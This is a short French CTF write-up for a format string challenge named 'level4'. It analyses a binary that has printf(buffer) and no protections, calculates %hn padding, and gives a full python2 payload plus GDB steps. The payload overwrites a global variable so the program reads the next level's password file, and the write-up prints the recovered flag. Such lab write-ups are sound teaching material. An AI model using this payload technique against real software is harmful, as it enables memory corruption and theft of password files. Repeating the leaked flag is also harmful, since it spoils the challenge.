# Format String Exploitation (CTF - Level4)

## ✨ Objectif

Exploiter une vulnérabilité de format string pour écrire la valeur `0x01025544` dans la variable globale `m` située à l'adresse `0x08049810`, afin de déclencher l'appel à `system("/bin/cat /home/user/level5/.pass")` et récupérer le flag.

---

## 👁️ Analyse du Binaire

### Protections désactivées :

```
RELRO           STACK CANARY      NX            PIE             
No RELRO        No canary found   NX disabled   No PIE
```

✅ Parfait pour l'exploitation : adresses fixes, exécution possible, aucune vérification.

### Fonction vulnérable :

```c
char buffer[512];
fgets(buffer, 512, stdin);
printf(buffer); // vulnérable !
```

---

## 🔫 Plan d'attaque (Format String)

### Objectif : écrire

```c
*(int*)0x08049810 = 0x01025544;
```

### Mémoire (Little Endian)

| Octet | Valeur | Adresse    |
| ----- | ------ | ---------- |
| 0     | 0x44   | 0x08049810 |
| 1     | 0x55   | 0x08049811 |
| 2     | 0x02   | 0x08049812 |
| 3     | 0x01   | 0x08049813 |

On utilise `%hn` (2 octets) pour écrire en 2 fois :

* `0x5544` → `0x08049810`
* `0x0102` → `0x08049812`

---

## 📉 Formule générale (avec %hn)

### Données :

```text
target_low  = 0x5544 = 21828
target_high = 0x0102 = 258
written_before = 12 (octets dans le buffer avant %c)
```

### Calculs :

```text
padding_high = target_high - written_before = 258 - 12 = 246
padding_low  = target_low - target_high     = 21828 - 258 = 21570
```

### Payload final :

```bash
python2 -c 'print(
"\x10\x98\x04\x08" +       # %12$hn (basse)
"\x12\x98\x04\x08" +       # %13$hn (haute)
"AAAA" +
"%246c%13$hn" +              # 0x0102 (haut)
"%21570c%12$hn"              # 0x5544 (bas)
)' > /tmp/caca
```

---

## 📊 Utilisation en GDB

```bash
gdb ./level4
b *0x0804848d
r < /tmp/caca
x/wx 0x08049810
# Doit afficher : 0x01025544
```

Puis :

```bash
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
---

## 🚀 TL;DR

* Utiliser `%hn` pour écrire 2 octets à la fois
* Calculer les bons `%c` avec :

  * `padding_high = valeur_haute - octets_déjà_affichés`
  * `padding_low  = valeur_basse - valeur_haute`
* Tester et ajuster en GDB si besoin

---